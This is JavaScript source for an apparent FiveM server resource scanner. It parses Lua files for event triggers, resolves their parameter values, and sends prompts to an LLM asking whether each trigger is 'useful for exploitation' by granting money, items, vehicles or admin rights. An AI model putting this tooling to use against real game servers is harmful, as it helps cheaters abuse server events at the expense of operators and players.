        } else if (fieldName === 'exp') {
            return '100';
        }

        return varName;
    }

    const escapedVarName = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const varNameRegex = new RegExp(`\\blocal\\s+${escapedVarName}\\s*=\\s*([^\\n]+)|\\b${escapedVarName}\\s*=\\s*([^\\n]+)`, 'i');

    for (let i = lines.length - 1; i >= 0; i--) {
        const line = lines[i];
        const match = line.match(varNameRegex);
        if (match) {
            const value = (match[1] || match[2]).trim();

            const cleanValue = value.split('--')[0].trim();

            let finalValue = cleanValue.replace(/;+$/, '').trim();

            if (finalValue.includes('*') || finalValue.includes('+') || finalValue.includes('-') || finalValue.includes('/')) {

                const calculatedValue = evaluateExpression(finalValue, context, lines, i);
                if (calculatedValue !== null) {
                    return calculatedValue;
                }

                if (varName.toLowerCase().includes('price') || varName.toLowerCase().includes('money')) {
                    return '0.0';
                } else if (varName.toLowerCase().includes('exp')) {
                    return '100';
                } else if (varName.toLowerCase().includes('id') || varName.toLowerCase().includes('task')) {
                    return '1';
                }
            }

            if (finalValue.match(/^["'].*["']$/)) {
                return finalValue;
            }

            if (finalValue.match(/^\d+(\.\d+)?$/)) {
                return finalValue;
            }

            if (finalValue.includes('.')) {
                const tableMatch = finalValue.match(/^([a-zA-Z_][a-zA-Z0-9_]*)\\.([a-zA-Z_][a-zA-Z0-9_]*)$/);
                if (tableMatch) {
                    const tableName = tableMatch[1];
                    const fieldName = tableMatch[2];

                    const nestedTableValue = findTableFieldValue(tableName, fieldName, context);
                    if (nestedTableValue !== null) {
                        return nestedTableValue;
                    }
                }
            }

            if (finalValue.match(/^[a-zA-Z_][a-zA-Z0-9_.]*$/)) {
                const nestedValue = findVariableValue(finalValue, context, i + 1);
                if (nestedValue !== null && nestedValue !== finalValue) {
                    return nestedValue;
                }
            }

            if (varName.toLowerCase().includes('price') || varName.toLowerCase().includes('money')) {
                return '0.0';
            } else if (varName.toLowerCase().includes('exp')) {
                return '100';
            } else if (varName.toLowerCase().includes('id') || varName.toLowerCase().includes('task')) {
                return '1';
            }
            
            return finalValue;
        }
    }

    if (varName.toLowerCase().includes('price') || varName.toLowerCase().includes('money')) {
        return '0.0';
    } else if (varName.toLowerCase().includes('exp')) {
        return '100';
    } else if (varName.toLowerCase().includes('id') || varName.toLowerCase().includes('task')) {
        return '1';
    }
    
    return null;
}

function evaluateExpression(expression, context, lines, startLine) {
    try {

        expression = expression.trim();

        const multMatch = expression.match(/([a-zA-Z_][a-zA-Z0-9_.]*)\s*\*\s*([a-zA-Z_][a-zA-Z0-9_.]*)/);
        if (multMatch) {
            const leftVar = multMatch[1];
            const rightVar = multMatch[2];

            const leftValue = findVariableValue(leftVar, context, startLine);
            const rightValue = findVariableValue(rightVar, context, startLine);

            if (leftValue && rightValue && leftValue.match(/^\d+(\.\d+)?$/) && rightValue.match(/^\d+(\.\d+)?$/)) {
                const result = parseFloat(leftValue) * parseFloat(rightValue);
                return result.toString();
            }

            if ((leftValue === '0' || leftValue === '0.0') || (rightValue === '0' || rightValue === '0.0')) {
                return '0.0';
            }

            if (expression.toLowerCase().includes('price') || expression.toLowerCase().includes('money')) {
                return '0.0';
            }
        }

        const addMatch = expression.match(/([a-zA-Z_][a-zA-Z0-9_.]*)\s*\+\s*([a-zA-Z_][a-zA-Z0-9_.]*)/);
        if (addMatch) {
            const leftVar = addMatch[1];
            const rightVar = addMatch[2];
            
            const leftValue = findVariableValue(leftVar, context, startLine);
            const rightValue = findVariableValue(rightVar, context, startLine);
            
            if (leftValue && rightValue && leftValue.match(/^\d+(\.\d+)?$/) && rightValue.match(/^\d+(\.\d+)?$/)) {
                const result = parseFloat(leftValue) + parseFloat(rightValue);
                return result.toString();
            }
        }

        const configMatch = expression.match(/Config\.[a-zA-Z0-9_.]+/);
        if (configMatch) {

            if (expression.toLowerCase().includes('price') || expression.toLowerCase().includes('money')) {
                return '0.0';
            }
        }

        const orMatch = expression.match(/\([^)]+\s+or\s+(\d+(\.\d+)?)\)/i);
        if (orMatch) {
            return orMatch[1];
        }
        
        return null;
    } catch (error) {
        console.error('Error evaluating expression:', error);
        return null;
    }
}

function findTableFieldValue(tableName, fieldName, context) {

    const lines = context.split('\n');
    let braceCount = 0;

    for (let i = lines.length - 1; i >= 0; i--) {
        const line = lines[i];

        const tableAssignRegex = new RegExp(`\\b${tableName}\\s*=\\s*\\{`, 'i');
        if (tableAssignRegex.test(line)) {
            braceCount = 1;

            let tableContent = line.substring(line.indexOf('{') + 1);

            for (let j = i; j < lines.length && braceCount > 0 && j < i + 20; j++) {
                const currentLine = j === i ? tableContent : lines[j];

                const fieldRegex = new RegExp(`\\b${fieldName}\\s*=\\s*([^,}]+)`, 'i');
                const fieldMatch = currentLine.match(fieldRegex);
                if (fieldMatch) {
                    let value = fieldMatch[1].trim();

                    value = value.split('--')[0].trim();

                    value = value.replace(/;+$/, '').trim();

                    if (value.match(/^["'].*["']$/)) {
                        value = value.replace(/^["']|["']$/g, '');
                    }
                    return value;
                }

                for (let k = 0; k < currentLine.length; k++) {
                    const char = currentLine[k];
                    if (char === '{') braceCount++;
                    if (char === '}') braceCount--;
                }
            }
            break;
        }
    }
    
    return null;
}

function extractValuesManually(paramList, context, lineNumber, actualValues) {
    paramList.forEach((param, index) => {
        const cleanParam = param.trim();
        
        if (cleanParam.match(/^["'].*["']$/) || cleanParam.match(/^\d+(\.\d+)?$/)) {
            actualValues[index] = cleanParam;
            return;
        }
        
        if (cleanParam.match(/^[a-zA-Z_][a-zA-Z0-9_.]*$/)) {
            const varValue = findVariableValue(cleanParam, context, lineNumber - 1);
            if (varValue !== null && varValue !== cleanParam) {
                actualValues[index] = varValue;
            } else {
                actualValues[index] = cleanParam;
            }
        } else {
            actualValues[index] = cleanParam;
        }
    });
}

async function processAIQueue() {
    if (AI_QUEUE.processing || AI_QUEUE.queue.length === 0) {
        return;
    }
    
    AI_QUEUE.processing = true;
    
    while (AI_QUEUE.queue.length > 0) {
        const item = AI_QUEUE.queue.shift();
        try {
            console.log('[AI QUEUE] Processing:', item.triggerName);
            const result = await analyzeTriggerWithAI(item.triggerName, item.triggerCall, item.content, item.lineNumber, item.fileName);
            console.log('[AI QUEUE] Result for', item.triggerName, ':', result);
            
            if (result) {
                let updated = false;
                
                if (window._debugTriggersArray) {
                    const triggerIndex = window._debugTriggersArray.findIndex(t => 
                        t.usage === item.triggerCall && 
                        t.resource === item.resourceName && 
                        t.line === item.lineNumber
                    );
                    if (triggerIndex !== -1) {
                        window._debugTriggersArray[triggerIndex].risk = result.risk;
                        window._debugTriggersArray[triggerIndex].aiAnalysis = result;
                        console.log('[AI QUEUE] Updated trigger in local array, risk:', result.risk);
                        updated = true;
                    }
                }
                
                if (appState.scanResults && appState.scanResults.triggers) {
                    const triggerIndex = appState.scanResults.triggers.findIndex(t => 
                        t.usage === item.triggerCall && 
                        t.resource === item.resourceName && 
                        t.line === item.lineNumber
                    );
                    if (triggerIndex !== -1) {
                        appState.scanResults.triggers[triggerIndex].risk = result.risk;
                        appState.scanResults.triggers[triggerIndex].aiAnalysis = result;
                        console.log('[AI QUEUE] Updated trigger risk in appState to:', result.risk);
                        updated = true;
                        if (document.getElementById('triggers-tbody')) {
                            updateTriggersTable(appState.scanResults.triggers);
                        }
                    }
                }
                
                if (!updated) {
                    console.log('[AI QUEUE] WARNING: Trigger not found in any array');
                }
            }
        } catch (error) {
            console.error('[AI QUEUE] Error processing:', item.triggerName, error);
            if (error.message && error.message.includes('429')) {
                console.log('[AI QUEUE] Rate limited, waiting longer before retry');
                AI_QUEUE.queue.unshift(item);
                await new Promise(resolve => setTimeout(resolve, AI_QUEUE.retryDelay));
            }
        }
        
        if (AI_QUEUE.queue.length > 0) {
            await new Promise(resolve => setTimeout(resolve, AI_QUEUE.delay));
        }
    }
    
    AI_QUEUE.processing = false;
}

async function analyzeTriggerRiskWithAI(triggerName, fullLine, fileContent, lineNumber, fileName) {
    console.log('[AI RISK] Starting analyzeTriggerRiskWithAI');
    console.log('[AI RISK] triggerName:', triggerName);
    console.log('[AI RISK] lineNumber:', lineNumber);
    console.log('[AI RISK] fileName:', fileName);
    console.log('[AI RISK] fileContent length:', fileContent ? fileContent.length : 0);
    try {
        if (!AI_CONFIG.API_KEY) {
            console.log('[AI RISK] ERROR: No API key');
            return null;
        }

        const lines = fileContent.split('\n');
        const contextStart = Math.max(0, lineNumber - 30);
        const contextEnd = Math.min(lines.length, lineNumber + 30);
        const contextLines = lines.slice(contextStart, contextEnd);
        const contextCode = contextLines.join('\n');
        
        const triggerLine = lines[lineNumber - 1] || fullLine;
        console.log('[AI RISK] Context lines:', contextStart, 'to', contextEnd, 'Total lines:', lines.length);
        console.log('[AI RISK] Trigger line:', triggerLine.substring(0, 100));
        
        const prompt = `You are analyzing Lua code for a FiveM server to determine if a trigger is actually useful for exploitation.

TRIGGER CALL:
${fullLine}

TRIGGER LINE IN FILE (line ${lineNumber}):
${triggerLine}

CODE CONTEXT (lines ${contextStart + 1}-${contextEnd}):
${contextCode}

TASK:
Analyze the code context to determine if this trigger ACTUALLY performs a useful action (gives items, money, vehicles, admin privileges, etc.) or if it just has a misleading name.

IMPORTANT RULES:
1. DO NOT rely only on the trigger name - check what the code actually DOES
2. Look for server-side handlers (RegisterServerEvent, AddEventHandler) that handle this trigger
3. Check if the handler actually gives items/money/vehicles/admin privileges
4. If the trigger name suggests "give item" but the code just logs or checks something, it's NOT useful
5. If the trigger name suggests "money" but the code doesn't actually manipulate money, it's NOT useful
6. Only mark as useful if the code ACTUALLY performs the action suggested by the name

Return ONLY a JSON object with this exact format:
{
  "verified": true/false,
  "risk": "High"/"Medium"/"Low",
  "category": "Money"/"Items"/"Vehicles"/"Admin"/"Weapons"/"Unknown",
  "useful": true/false,
  "description": "Brief explanation of what the trigger actually does",
  "confidence": 0.0-1.0
}

If verified=true, the trigger actually performs useful actions.
If verified=false, the trigger name is misleading and doesn't actually do anything useful.

Return ONLY the JSON, no explanations.`;

        console.log('[AI RISK] Making API request to:', AI_CONFIG.API_URL);
        console.log('[AI RISK] Model:', AI_CONFIG.MODEL);
        console.log('[AI RISK] Prompt length:', prompt.length);
        
        const response = await fetch(AI_CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${AI_CONFIG.API_KEY}`
            },
            body: JSON.stringify({
                model: AI_CONFIG.MODEL,
                messages: [
                    {
                        role: 'system',
                        content: 'You are a Lua code analyzer for FiveM servers. Analyze code context to determine if triggers actually perform useful actions. Return only valid JSON.'
                    },
                    {
                        role: 'user',
                        content: prompt
                    }
                ],
                temperature: 0.1,
                max_tokens: 500,
                stream: false
            })
        });

        console.log('[AI RISK] API response status:', response.status, response.statusText);

        if (!response.ok) {
            const errorText = await response.text();
            console.error('[AI RISK] API error response:', response.status, errorText);
            if (response.status === 402) {
                AI_CONFIG.ENABLED = false;
                throw new Error('Payment required (402). API key has no credits or is invalid. AI disabled.');
            }
            if (response.status === 429) {
                throw new Error('Rate limit exceeded (429)');
            }
            return {
                verified: false,
                risk: 'Low',
                category: 'Unknown',
                useful: false,
                description: 'AI analysis unavailable',
                confidence: 0
            };
        }

        const data = await response.json();
        console.log('[AI RISK] API response data:', data);
        const aiResponse = data.choices?.[0]?.message?.content?.trim();
        console.log('[AI RISK] AI response text:', aiResponse);
        
        if (!aiResponse) {
            console.error('[AI RISK] No response content from AI');
            return {
                verified: false,
                risk: 'Low',
                category: 'Unknown',
                useful: false,
                description: 'AI analysis unavailable',
                confidence: 0
            };
        }

        let jsonStr = aiResponse;
        const jsonMatch = aiResponse.match(/```(?:json)?\s*(\{[\s\S]*\})\s*```/);
        if (jsonMatch) {
            jsonStr = jsonMatch[1];
            console.log('[AI RISK] Extracted JSON from code block');
        } else {
            const braceMatch = aiResponse.match(/\{[\s\S]*\}/);
            if (braceMatch) {
                jsonStr = braceMatch[0];
                console.log('[AI RISK] Extracted JSON from braces');
            }
        }

        console.log('[AI RISK] JSON string to parse:', jsonStr.substring(0, 200));

        try {
            const result = JSON.parse(jsonStr);
            console.log('[AI RISK] Parsed result:', result);
            return result;
        } catch (parseError) {
            console.error('[AI RISK] JSON parse error:', parseError);
            console.error('[AI RISK] Failed to parse:', jsonStr);
            return {
                verified: false,
                risk: 'Low',
                category: 'Unknown',
                useful: false,
                description: 'AI analysis parse error',
                confidence: 0
            };
        }
    } catch (error) {
        console.error('[AI RISK] Exception in analyzeTriggerRiskWithAI:', error);
        console.error('[AI RISK] Error stack:', error.stack);
        return {
            verified: false,
            risk: 'Low',
            category: 'Unknown',
            useful: false,
            description: 'AI analysis error',
            confidence: 0
        };
    }
}

async function analyzeTriggerParametersWithAI(fileContent, triggerCall, lineNumber, paramList) {
    try {
        const now = Date.now();
        if (AI_CONFIG.RATE_LIMITED && now < AI_CONFIG.RATE_LIMIT_UNTIL) {
            const remaining = Math.ceil((AI_CONFIG.RATE_LIMIT_UNTIL - now) / 1000);
            throw new Error(`Rate limit exceeded. Please wait ${remaining} seconds.`);
        }

        const lines = fileContent.split('\n');
        const contextCode = fileContent;
        const triggerLine = lines[lineNumber - 1] || triggerCall;
        
        const prompt = `You are analyzing Lua code for a FiveM server. I need you to extract actual values for trigger parameters.

TRIGGER CALL:
${triggerCall}

FULL FILE CONTENT:
${contextCode}

TRIGGER IS ON LINE ${lineNumber}:
${triggerLine}

PARAMETERS TO EXTRACT:
${paramList.map((p, i) => `${i + 1}. ${p.trim()}`).join('\n')}

TASK:
Search through the ENTIRE file to find the actual values for each parameter. Look for:
1. Variable definitions (local var = value) - search the whole file, not just near the trigger
2. Table field access (table.field) - find where the table is defined in the file
3. Calculations (var1 * var2, etc.) - trace back through the file to find all variable values
4. Function calls that return values - check the whole file for function definitions
5. Config table access (Config.Something.Value) - search entire file for Config definitions
6. Look for variable assignments anywhere in the file that might be used in the trigger

Return ONLY a JSON object with this exact format:
{
  "0": "extracted_value_for_first_param",
  "1": "extracted_value_for_second_param",
  ...
}

RULES:
- For numbers, return as string (e.g., "100", "0.0", "100000.0")
- For strings, return with quotes (e.g., "money", "item_name")
- For calculations you can't resolve, return "0.0" for prices/money, "100" for exp, "1" for IDs
- For table.field access, find the table definition and extract the field value
- If variable is not found, use smart defaults based on name:
  * price/money/cash -> "0.0"
  * exp/experience -> "100"
  * id/taskId -> "1"
  * reward/basePrice -> "100000.0"

Return ONLY the JSON, no explanations.`;

        const response = await fetch(AI_CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${AI_CONFIG.API_KEY}`
            },
            body: JSON.stringify({
                model: AI_CONFIG.MODEL,
                messages: [
                    {
                        role: 'system',
                        content: 'You are a Lua code analyzer. Extract actual values from code context and return only valid JSON.'
                    },
                    {
                        role: 'user',
                        content: prompt
                    }
                ],
                temperature: 0.1,
                max_tokens: 1000,
                stream: false
            })
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('AI API error:', response.status, errorText);
            let errorData = null;
            try {
                errorData = JSON.parse(errorText);
            } catch (e) {
                console.error('Could not parse error response as JSON');
            }
            
            if (response.status === 401 || response.status === 403) {
                AI_CONFIG.ENABLED = false;
                const errorMsg = errorData?.error?.message || errorText || 'Authentication failed';
                throw new Error(`Authentication failed (${response.status}): ${errorMsg}. Please check your API key.`);
            }
            if (response.status === 402) {
                AI_CONFIG.ENABLED = false;
                const errorMsg = errorData?.error?.message || errorText || 'Insufficient balance';
                throw new Error(`Payment required (402): ${errorMsg}. API key has no credits or is invalid.`);
            }
            if (response.status === 429) {
                AI_CONFIG.RATE_LIMITED = true;
                AI_CONFIG.RATE_LIMIT_UNTIL = Date.now() + 120000;
                throw new Error('Rate limit exceeded (429). AI disabled for 2 minutes.');
            }
            return null;
        }

        const data = await response.json();
        const aiResponse = data.choices?.[0]?.message?.content?.trim();
        
        if (!aiResponse) {
            console.error('No response from AI:', data);
            return null;
        }

        let jsonStr = aiResponse;
        const jsonMatch = aiResponse.match(/```(?:json)?\s*(\{[\s\S]*\})\s*```/);
        if (jsonMatch) {
            jsonStr = jsonMatch[1];
        } else {
            const braceMatch = aiResponse.match(/\{[\s\S]*\}/);
            if (braceMatch) {
                jsonStr = braceMatch[0];
            }
        }

        const extractedValues = JSON.parse(jsonStr);

        const result = {};
        Object.keys(extractedValues).forEach(key => {
            const index = parseInt(key);
            if (!isNaN(index)) {
                result[index] = extractedValues[key];
            }
        });

        return result;
    } catch (error) {
        console.error('Error in AI analysis:', error);
        return null;
    }
}

function openTriggerPreview(resource, file, line) {
    try {

        try {
            viewTrigger(resource, file, line);
        } catch (e) {
            console.error('Error navigating to resource explorer from preview:', e);
        }

        const previewModal = document.createElement('div');
        previewModal.className = 'file-viewer-modal';
        previewModal.style.zIndex = '10000';

        const overlay = document.createElement('div');
        overlay.className = 'file-viewer-overlay';

        const window = document.createElement('div');
        window.className = 'file-viewer-window';

        const fileName = file.split('/').pop() || file;

        window.innerHTML = `
            <div class="file-viewer-header">
                <div class="file-viewer-title">
                    <i class="fas fa-file-code"></i>
                    File Preview: ${fileName}
                </div>
                <div class="file-viewer-search">
                    <input type="text" id="file-search-input" placeholder="Search in file..." />
                    <div class="search-controls">
                        <button id="search-prev" title="Previous match">
                            <i class="fas fa-chevron-up"></i>
                        </button>
                        <button id="search-next" title="Next match">
                            <i class="fas fa-chevron-down"></i>
                        </button>
                        <span id="search-count"></span>
                    </div>
                </div>
                <div class="file-viewer-actions">
                    <button class="file-viewer-copy" id="copy-preview-code" title="Copy all code">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="file-viewer-close" id="close-preview">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            <div class="file-viewer-content">
                <pre><code id="preview-code">Loading file content...</code></pre>
            </div>
        `;

        previewModal.appendChild(overlay);
        previewModal.appendChild(window);
        document.body.appendChild(previewModal);

        const closeBtn = window.querySelector('#close-preview');
        const closePreview = () => {
            document.body.removeChild(previewModal);
        };

        closeBtn.addEventListener('click', closePreview);
        overlay.addEventListener('click', closePreview);

        const copyBtn = window.querySelector('#copy-preview-code');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                const codeElement = window.querySelector('#preview-code');
                const plainText = codeElement.textContent || codeElement.innerText || '';

                navigator.clipboard.writeText(plainText).then(() => {
                    showNotification('Code copied to clipboard', 'success');
                }).catch(err => {
                    console.error('Failed to copy:', err);

                    const textArea = document.createElement('textarea');
                    textArea.value = plainText;
                    textArea.style.position = 'fixed';
                    textArea.style.opacity = '0';
                    document.body.appendChild(textArea);
                    textArea.select();
                    try {
                        document.execCommand('copy');
                        showNotification('Code copied to clipboard', 'success');
                    } catch (e) {
                        showNotification('Failed to copy code', 'error');
                    }
                    document.body.removeChild(textArea);
                });
            });
        }

        const handleEscape = (e) => {
            if (e.key === 'Escape') {
                closePreview();
                document.removeEventListener('keydown', handleEscape);
            }
        };
        document.addEventListener('keydown', handleEscape);


        console.log('Opening preview for file:', file, 'line:', line);
        loadFileContent(file, window, line);

        setupFileSearch(window);

        showNotification('Opening file preview', 'info');
    } catch (error) {
        console.error('Error opening file preview:', error);
        showNotification('Error opening preview', 'error');
    }
}

function loadFileContent(filePath, previewWindow, highlightLine = 0) {
    try {

        console.log('loadFileContent: Looking for file:', filePath);

        const fileName = filePath.split('/').pop() || filePath;
        let file = null;

        if (filePath) {
            file = appState.selectedFiles.find(f => {
                const relativePath = f.webkitRelativePath || `web_upload/${f.name}`;

                if (relativePath === filePath) {
                    console.log('Found file by exact match:', relativePath);
                    return true;
                }

                if (relativePath.endsWith('/' + filePath) || relativePath.endsWith(filePath)) {
                    console.log('Found file by endsWith match:', relativePath);
                    return true;
                }
                return false;
            });
        }

        if (!file && filePath && filePath.includes('/')) {
            file = appState.selectedFiles.find(f => {
                const relativePath = f.webkitRelativePath || `web_upload/${f.name}`;
                if (relativePath.includes(filePath)) {
                    console.log('Found file by partial match:', relativePath);
                    return true;
                }
                return false;
            });
        }

        if (!file) {
            file = appState.selectedFiles.find(f => {
                if (f.name === fileName) {
                    console.log('Found file by filename only:', f.name, 'but path is:', f.webkitRelativePath);
                    return true;
                }
                return false;
            });
        }
        
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                const codeElement = previewWindow.querySelector('#preview-code');

                const fileExtension = fileName.split('.').pop().toLowerCase();
                let highlightedContent = '';
                
                switch (fileExtension) {
                    case 'lua':
                        highlightedContent = highlightLua(content);
                        break;
                    case 'js':
                        highlightedContent = highlightJavaScript(content);
                        break;
                    case 'xml':
                        highlightedContent = highlightXML(content);
                        break;
                    case 'json':
                        highlightedContent = highlightJSON(content);
                        break;
                    case 'html':
                        highlightedContent = highlightHTML(content);
                        break;
                    case 'css':
                        highlightedContent = highlightCSS(content);
                        break;
                    case 'php':
                        highlightedContent = highlightPHP(content);
                        break;
                    case 'py':
                        highlightedContent = highlightPython(content);
                        break;
                    default:
                        highlightedContent = escapeHtml(content);
                }

                if (highlightLine > 0) {
                    const lines = highlightedContent.split('\n');
                    const highlightedLines = lines.map((line, index) => {
                        const lineNum = index + 1;
                        if (lineNum === highlightLine) {
                            return `<span class="highlighted-line" data-line="${lineNum}" style="background: rgba(255, 255, 0, 0.3); display: block; padding: 2px 0;">${line || ' '}</span>`;
                        }
                        return line;
                    });
                    highlightedContent = highlightedLines.join('\n');
                }
                
                codeElement.innerHTML = highlightedContent;

                if (highlightLine > 0) {
                    setTimeout(() => {
                        const highlightedLineElement = codeElement.querySelector(`.highlighted-line[data-line="${highlightLine}"]`);
                        if (highlightedLineElement) {
                            highlightedLineElement.scrollIntoView({ behavior: 'smooth', block: 'center' });

                            highlightedLineElement.style.animation = 'pulse 2s ease-in-out';
                        }
                    }, 100);
                }
            };
            reader.readAsText(file);
        } else {
            const codeElement = previewWindow.querySelector('#preview-code');
            codeElement.innerHTML = '<span style="color: #e05572;">File not found in selected files</span>';
        }
    } catch (error) {
        console.error('Error loading file content:', error);
        const codeElement = previewWindow.querySelector('#preview-code');
        codeElement.innerHTML = '<span style="color: #e05572;">Error loading file content</span>';
    }
}


function highlightJavaScript(code) {


    let html = code
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');


    html = html.replace(/(&quot;)((?:(?!&quot;)[^&]|&(?!quot;))*)&quot;/g, '<span class="js-string">$1$2$1</span>');
    html = html.replace(/(&#039;)((?:(?!&#039;)[^&]|&(?!#039;))*)&#039;/g, '<span class="js-string">$1$2$1</span>');

    html = html.replace(/(`)((?:(?!`)[^\\]|\\.)*)\1/g, '<span class="js-string">$1$2$1</span>');

    html = html.replace(/(\/\/[^\n]*)/g, '<span class="js-comment">$1</span>');
    html = html.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="js-comment">$1</span>');

    html = html.replace(/\b(\d+\.?\d*)\b/g, '<span class="js-number">$1</span>');

    const keywords = ['function', 'var', 'let', 'const', 'if', 'else', 'for', 'while', 'do', 'switch', 'case', 'break', 'continue', 'return', 'try', 'catch', 'finally', 'throw', 'new', 'delete', 'typeof', 'instanceof', 'in', 'of', 'class', 'extends', 'super', 'import', 'export', 'default', 'async', 'await', 'yield', 'get', 'set', 'static', 'public', 'private', 'protected', 'interface', 'enum', 'namespace', 'module', 'require', 'exports', 'console', 'document', 'window', 'Math', 'Date', 'Array', 'Object', 'String', 'Number', 'Boolean', 'RegExp', 'Error', 'Promise', 'Map', 'Set', 'WeakMap', 'WeakSet', 'Symbol', 'Proxy', 'Reflect', 'JSON', 'parse', 'stringify', 'log', 'warn', 'error', 'info', 'debug', 'assert', 'clear', 'count', 'countReset', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'profile', 'profileEnd', 'table', 'time', 'timeEnd', 'timeLog', 'timeStamp', 'trace'];
    const keywordPattern = '\\b(' + keywords.join('|') + ')\\b';
    const keywordRegex = new RegExp(keywordPattern, 'g');
    html = html.replace(keywordRegex, function(match, keyword, offset, string) {

        const before = string.substring(0, offset);
        const openCount = (before.match(/<span[^>]*>/g) || []).length;
        const closeCount = (before.match(/<\/span>/g) || []).length;

        if (openCount > closeCount) {
            return match;
        }
        return '<span class="js-keyword">' + match + '</span>';
    });
    
    return html;
}

function highlightXML(code) {
    return code
        .replace(/(&lt;\/?)([a-zA-Z][a-zA-Z0-9]*)([^&]*?)(&gt;)/g, '<span class="xml-tag">$1$2$3$4</span>')
        .replace(/([a-zA-Z][a-zA-Z0-9]*)=/g, '<span class="xml-attr">$1</span>=')
        .replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="xml-value">$1$2$1</span>')
        .replace(/(&lt;!--[\s\S]*?--&gt;)/g, '<span class="xml-comment">$1</span>');
}

function highlightJSON(code) {
    return code
        .replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="js-string">$1$2$1</span>')
        .replace(/\b(true|false|null)\b/g, '<span class="js-keyword">$1</span>')
        .replace(/\b(\d+\.?\d*)\b/g, '<span class="js-number">$1</span>');
}

function highlightHTML(code) {
    return code
        .replace(/(&lt;\/?)([a-zA-Z][a-zA-Z0-9]*)([^&]*?)(&gt;)/g, '<span class="xml-tag">$1$2$3$4</span>')
        .replace(/([a-zA-Z][a-zA-Z0-9]*)=/g, '<span class="xml-attr">$1</span>=')
        .replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="xml-value">$1$2$1</span>')
        .replace(/(&lt;!--[\s\S]*?--&gt;)/g, '<span class="xml-comment">$1</span>');
}

function highlightCSS(code) {
    return code
        .replace(/([a-zA-Z-]+)(?=\s*:)/g, '<span class="css-property">$1</span>')
        .replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="css-string">$1$2$1</span>')
        .replace(/\b(\d+\.?\d*)(px|em|rem|%|vh|vw|pt|pc|in|cm|mm)?\b/g, '<span class="css-number">$1$2</span>')
        .replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="css-comment">$1</span>');
}

function highlightPHP(code) {
    return code
        .replace(/\b(function|class|interface|trait|namespace|use|as|extends|implements|public|private|protected|static|abstract|final|const|var|global|static|echo|print|return|if|else|elseif|endif|for|foreach|while|do|switch|case|break|continue|goto|try|catch|finally|throw|new|clone|unset|isset|empty|die|exit|include|include_once|require|require_once|__construct|__destruct|__call|__callStatic|__get|__set|__isset|__unset|__sleep|__wakeup|__toString|__invoke|__set_state|__clone|__debugInfo|__halt_compiler|array|callable|string|int|float|bool|true|false|null|self|parent|__CLASS__|__DIR__|__FILE__|__FUNCTION__|__LINE__|__METHOD__|__NAMESPACE__|__TRAIT__)\b/g, '<span class="php-keyword">$1</span>')
        .replace(/(\/\/.*$)/gm, '<span class="php-comment">$1</span>')
        .replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="php-comment">$1</span>')
        .replace(/(["'])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="php-string">$1$2$1</span>')
        .replace(/\b(\d+\.?\d*)\b/g, '<span class="php-number">$1</span>')
        .replace(/(\$\w+)/g, '<span class="php-variable">$1</span>');
}

function highlightPython(code) {
    return code
        .replace(/\b(def|class|if|elif|else|for|while|try|except|finally|with|as|import|from|return|break|continue|pass|raise|assert|del|global|nonlocal|lambda|and|or|not|is|in|True|False|None|self|super|__init__|__str__|__repr__|__len__|__getitem__|__setitem__|__delitem__|__iter__|__next__|__enter__|__exit__|print|len|range|list|dict|set|tuple|str|int|float|bool|type|isinstance|issubclass|hasattr|getattr|setattr|delattr|dir|vars|locals|globals|help|id|hash|open|file|input|raw_input|exec|eval|compile|execfile|reload|__import__|abs|all|any|bin|bool|bytearray|bytes|callable|chr|classmethod|complex|delattr|dict|dir|divmod|enumerate|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|isinstance|issubclass|iter|len|list|locals|map|max|memoryview|min|next|object|oct|open|ord|pow|print|property|range|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|vars|zip)\b/g, '<span class="py-keyword">$1</span>')
        .replace(/(#.*$)/gm, '<span class="py-comment">$1</span>')
        .replace(/(["'`])((?:(?!\1)[^\\]|\\.)*\1)/g, '<span class="py-string">$1$2$1</span>')
        .replace(/\b(\d+\.?\d*)\b/g, '<span class="py-number">$1</span>');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function setupFileViewerSearch(fileViewerModal) {
    try {
        const searchInput = fileViewerModal.querySelector('#file-viewer-search-input');
        const searchPrev = fileViewerModal.querySelector('#file-viewer-search-prev');
        const searchNext = fileViewerModal.querySelector('#file-viewer-search-next');
        const searchCount = fileViewerModal.querySelector('#file-viewer-search-count');
        const codeElement = fileViewerModal.querySelector('#file-viewer-text');
        
        if (!searchInput || !codeElement) {
            console.error('File viewer search elements not found');
            return;
        }
        
        let searchResults = [];
        let currentMatchIndex = -1;
        let originalContent = '';
        let originalHighlightedHTML = '';
        let isSearching = false;


        originalContent = codeElement.textContent || '';
        originalHighlightedHTML = codeElement.innerHTML || '';


        
        function performSearch(searchTerm) {
            if (!searchTerm.trim()) {
                clearSearch();
                return;
            }
            
            searchResults = [];
            currentMatchIndex = -1;
            
            const text = originalContent;
            const regex = new RegExp(escapeRegExp(searchTerm), 'gi');
            let match;
            
            while ((match = regex.exec(text)) !== null) {
                searchResults.push({
                    start: match.index,
                    end: match.index + match[0].length,
                    text: match[0]
                });
            }
            
            if (searchResults.length > 0) {
                currentMatchIndex = 0;
                highlightCurrentMatch();
            }
            
            updateSearchUI();
        }
        
        function highlightCurrentMatch() {
            if (searchResults.length === 0 || currentMatchIndex < 0) {
                clearSearch();
                return;
            }
            
            isSearching = true;

